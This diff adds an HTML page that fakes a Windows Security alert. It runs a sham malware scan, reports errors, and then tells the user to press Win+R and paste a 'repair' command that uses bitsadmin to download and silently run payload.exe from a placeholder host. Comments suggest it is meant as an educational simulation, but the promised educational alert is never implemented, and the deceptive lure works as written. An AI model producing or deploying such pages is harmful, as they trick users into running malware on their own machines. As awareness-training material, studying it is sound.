@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Windows Security - Action Required</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        height: 100%;
+      }
+
+      body {
+        font-family: "Segoe UI", system-ui, Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 9pt; /* Standard Windows font size */
+        background-color: #cc0100; /* Typical inactive window background area */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #000000;
+        overflow: hidden; /* Prevent scrollbars on body */
+      }
+
+      /* --- Initial Alert Box (Styled more like a basic message box) --- */
+      .alert-box {
+        background-color: #f0f0f0; /* Standard window background */
+        border: 1px solid #707070; /* Standard window border */
+        border-radius: 2px; /* Less rounded */
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 450px; /* Typical message box width */
+        padding: 20px;
+        display: flex;
+        align-items: flex-start; /* Align icon with text */
+        gap: 15px;
+      }
+
+      .alert-icon-container {
+        flex-shrink: 0;
+      }
+
+      .alert-icon {
+        width: 32px; /* Standard icon size */
+        height: 32px;
+        fill: #cc0000; /* Standard error red */
+      }
+
+      .alert-content {
+        text-align: left;
+        flex-grow: 1;
+      }
+
+      .alert-box h1 {
+        font-size: 11pt; /* Larger heading size */
+        font-weight: 600;
+        margin-top: 0;
+        margin-bottom: 10px;
+        color: #003399; /* Dark blue for heading */
+      }
+
+      .alert-box p {
+        font-size: 9pt;
+        line-height: 1.5;
+        margin-bottom: 15px;
+        color: #000000;
+      }
+
+      .scan-status {
+        font-style: normal;
+        color: #555;
+        margin-bottom: 15px;
+        min-height: 18px;
+        font-size: 9pt;
+        text-align: center;
+        width: 100%; /* Make status span width */
+        display: block;
+      }
+
+      .progress-bar-container {
+        width: 100%;
+        height: 14px; /* Standard progress bar height */
+        background-color: #ffffff;
+        border: 1px solid #bcbcbc;
+        border-radius: 0; /* No radius */
+        margin-bottom: 15px;
+        overflow: hidden;
+        padding: 1px; /* Inner padding for border effect */
+        box-sizing: content-box;
+      }
+
+      .progress-bar {
+        width: 0%;
+        height: 100%;
+        background-color: #32cd32; /* Green progress */
+        transition: width 0.5s ease-in-out;
+        float: left; /* Needed for height */
+      }
+
+      .progress-bar.error {
+        background-color: #cc0000; /* Red for error */
+      }
+
+      .alert-buttons {
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      .win-button {
+        /* General Windows Button Style */
+        background-color: #f0f0f0;
+        border: 1px solid #adadad;
+        color: #000000;
+        padding: 5px 12px;
+        border-radius: 2px;
+        font-size: 9pt;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        cursor: pointer;
+        margin-left: 6px;
+        min-width: 75px; /* Standard min width */
+        transition: background-color 0.1s ease, border-color 0.1s ease;
+        line-height: normal; /* Reset line height */
+      }
+
+      .win-button:hover {
+        background-color: #e5f1fb;
+        border-color: #0078d4;
+      }
+      .win-button:active {
+        background-color: #cce4f7;
+        border-color: #005a9e;
+      }
+      .win-button:focus {
+        outline: 1px dotted #000000;
+        outline-offset: 2px; /* Windows focus rectangle */
+        border-color: #0078d4; /* Border changes on focus too */
+      }
+
+      .win-button.primary {
+        /* Style for default/affirmative action */
+        border-color: #0078d4; /* Blue border */
+      }
+      .win-button.primary:focus {
+        outline-offset: 1px; /* Slightly different focus */
+      }
+
+      #actionButton {
+        display: none; /* Hidden initially */
+      }
+
+      /* --- Run Dialog Simulation Styles --- */
+      .run-dialog-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.6); /* Very subtle dim */
+        display: none; /* Hidden by default */
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .run-dialog {
+        background-color: #f0f0f0; /* Standard window background */
+        border: 1px solid #707070; /* Standard window border */
+        border-radius: 2px;
+        box-shadow: 0 3px 8px rgba(0, 0, 0, 0.25);
+        width: 90%;
+        max-width: 420px; /* Closer to Run dialog size */
+        font-size: 9pt;
+        color: #000000;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .run-dialog-title-bar {
+        background-color: #e1e1e1; /* Slightly different grey for title */
+        padding: 5px 8px;
+        font-weight: normal;
+        border-bottom: 1px solid #d1d1d1;
+        text-align: left;
+        font-size: 9pt;
+      }
+
+      .run-dialog-content {
+        padding: 15px;
+        text-align: left;
+        display: flex;
+        align-items: flex-start;
+        gap: 15px;
+      }
+
+      .run-dialog-icon {
+        width: 32px;
+        height: 32px;
+        flex-shrink: 0;
+        fill: #005a9e; /* Information blue */
+        /* Gear Icon SVG - Placeholder */
+        /* In a real scenario, use a more accurate icon */
+        content: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23005A9E" width="32px" height="32px"><path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg>');
+      }
+
+      .run-dialog-text {
+        flex-grow: 1;
+      }
+
+      .run-dialog-text p {
+        font-size: 9pt;
+        line-height: 1.4;
+        margin-bottom: 12px;
+        color: #000000;
+      }
+
+      .run-dialog code {
+        background-color: #e1e1e1; /* Slightly darker grey for code */
+        padding: 1px 4px;
+        border: 1px solid #c1c1c1;
+        border-radius: 2px;
+        font-family: Consolas, "Courier New", monospace;
+        font-size: 8.5pt; /* Slightly smaller for code */
+      }
+
+      .command-area {
+        margin-top: 10px;
+        margin-bottom: 15px;
+      }
+
+      .command-label {
+        display: block;
+        margin-bottom: 4px;
+        font-weight: normal;
+      }
+
+      .command-input {
+        width: 100%;
+        padding: 4px 6px; /* Smaller padding */
+        border: 1px solid #767676;
+        border-radius: 1px;
+        font-family: Consolas, "Courier New", monospace;
+        font-size: 9pt;
+        background-color: #ffffff; /* White input background */
+        margin-bottom: 6px;
+        white-space: pre;
+        overflow-x: auto;
+        cursor: text;
+        height: 24px; /* Standard height */
+      }
+
+      .dialog-button-pane {
+        text-align: right;
+        padding: 12px 15px;
+        background-color: #f0f0f0; /* Match window bg */
+        border-top: 1px solid #d1d1d1;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Main Alert Box -->
+    <div class="alert-box" id="mainAlertBox">
+      <div class="alert-icon-container">
+        <!-- Windows Security Shield Icon - Simplified SVG -->
+        <svg
+          class="alert-icon"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="#D9534F"
+        >
+          <path
+            d="M12 1.75L3.16 5.07v5.86c0 5.29 3.78 10.28 8.84 11.32 5.06-1.04 8.84-6.03 8.84-11.32V5.07L12 1.75zm-1 15l-3.72-3.72 1.41-1.41L11 14.17l5.3-5.3 1.41 1.42L11 16.75z"
+          />
+        </svg>
+        <!-- Warning Triangle Icon -->
+        <!-- <svg class="alert-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                 <path d="M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480H40c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24V296c0 13.3 10.7 24 24 24s24-10.7 24-24V184c0-13.3-10.7-24-24-24zm32 224c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z"/>
+             </svg> -->
+      </div>
+      <div class="alert-content">
+        <h1>Windows Security - Action Needed</h1>
+        <p>
+          Threat scan detected potential malware (Trojan:Win32/Tetapuxoid.C).
+          This may indicate corrupted system files.
+        </p>
+        <div class="scan-status" id="scanStatus">
+          Initializing security scan...
+        </div>
+        <div class="progress-bar-container" id="progressBarContainer">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <p id="alertMessage" style="display: none">
+          Scan complete. Errors found require manual repair to prevent system
+          instability or data loss. Click 'Run Repair' to start the process.
+        </p>
+        <div class="alert-buttons">
+          <button class="win-button primary" id="actionButton">
+            Run Repair
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Run Dialog Simulation (Initially Hidden) -->
+    <div class="run-dialog-overlay" id="runDialogOverlay">
+      <div class="run-dialog">
+        <div class="run-dialog-title-bar">Run Repair</div>
+        <div class="run-dialog-content">
+          <div class="run-dialog-icon">
+            <!-- Placeholder for icon -->
+          </div>
+          <div class="run-dialog-text">
+            <p>
+              To fix the detected system errors, please open the repair utility:
+            </p>
+            <ol style="margin-left: 20px; margin-bottom: 15px">
+              <li>
+                Press <code>Win</code> + <code>R</code> to open the Repair box.
+              </li>
+              <li>Copy the command below.</li>
+              <li>Paste it into the Repair box and press <b>Enter</b>.</li>
+            </ol>
+            <div class="command-area">
+              <label class="command-label" for="repairCommand"
+                >Repair Command:</label
+              >
+              <input
+                type="text"
+                class="command-input"
+                id="repairCommand"
+                readonly
+              />
+            </div>
+            <p style="font-size: 8.5pt; color: #444">
+              This script will diagnose and repair system integrity issues.
+            </p>
+          </div>
+        </div>
+        <div class="dialog-button-pane">
+          <button class="win-button" id="copyButton">Copy Command</button>
+          <button class="win-button" id="cancelDialogButton">Cancel</button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const scanStatus = document.getElementById("scanStatus");
+      const progressBarContainer = document.getElementById(
+        "progressBarContainer"
+      );
+      const progressBar = document.getElementById("progressBar");
+      const alertMessage = document.getElementById("alertMessage");
+      const actionButton = document.getElementById("actionButton");
+      const mainAlertBox = document.getElementById("mainAlertBox");
+
+      const runDialogOverlay = document.getElementById("runDialogOverlay");
+      const repairCommandInput = document.getElementById("repairCommand");
+      const copyButton = document.getElementById("copyButton");
+      const cancelDialogButton = document.getElementById("cancelDialogButton");
+
+      // --- Scan Simulation ---
+      progressBarContainer.style.display = "block"; // Show from start
+
+      setTimeout(() => {
+        scanStatus.textContent = "Scanning Windows system files...";
+        progressBar.style.width = "30%";
+      }, 800);
+
+      setTimeout(() => {
+        scanStatus.textContent = "Checking registry integrity...";
+        progressBar.style.width = "65%";
+      }, 2200);
+
+      setTimeout(() => {
+        scanStatus.textContent = "Scan complete. Errors detected.";
+        progressBar.style.width = "100%";
+        progressBar.classList.add("error"); // Make progress bar red
+      }, 3800);
+
+      // Show the final message and "Run Repair" button
+      setTimeout(() => {
+        alertMessage.style.display = "block";
+        actionButton.style.display = "inline-block";
+        progressBarContainer.style.opacity = "0.7"; // Fade progress bar slightly
+      }, 4200);
+
+      // --- Button Actions ---
+
+      // "Run Repair" button
+      actionButton.addEventListener("click", () => {
+        // Define the fake malicious command
+        const fakeCommand = `cmd.exe /c "bitsadmin /transfer TETAPUXFIX /download /priority high https://tetapux.example.com/payload.exe %TEMP%\\winfix.exe && %TEMP%\\winfix.exe /silent" # SID:${Math.random()
+          .toString(36)
+          .substring(2, 10)
+          .toUpperCase()}`;
+        repairCommandInput.value = fakeCommand;
+        runDialogOverlay.style.display = "flex";
+      });
+
+      // "Copy Command" button
+      copyButton.addEventListener("click", () => {
+        navigator.clipboard
+          .writeText(repairCommandInput.value)
+          .then(() => {
+            copyButton.textContent = "Copied!";
+            copyButton.disabled = true; // Briefly disable
+            setTimeout(() => {
+              copyButton.textContent = "Copy Command";
+              copyButton.disabled = false;
+            }, 1500);
+          })
+          .catch((err) => {
+            console.error("Failed to copy command: ", err);
+            // Optionally show an error state on the button
+          });
+      });
+
+      // "Cancel" button on the dialog
+      cancelDialogButton.addEventListener("click", () => {
+        runDialogOverlay.style.display = "none";
+
+        // Show the *real* educational alert
+      });
+    </script>
+  </body>
+</html>
